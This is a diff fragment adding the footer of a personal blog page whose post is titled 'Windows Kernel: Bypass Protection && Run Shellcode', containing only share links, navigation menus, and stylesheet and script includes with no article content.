+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/11/Windows-Kernel-Bypass-Protection-Run-Shellcode/&name=Windows Kernel: Bypass Protection &amp;&amp; Run Shellcode&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
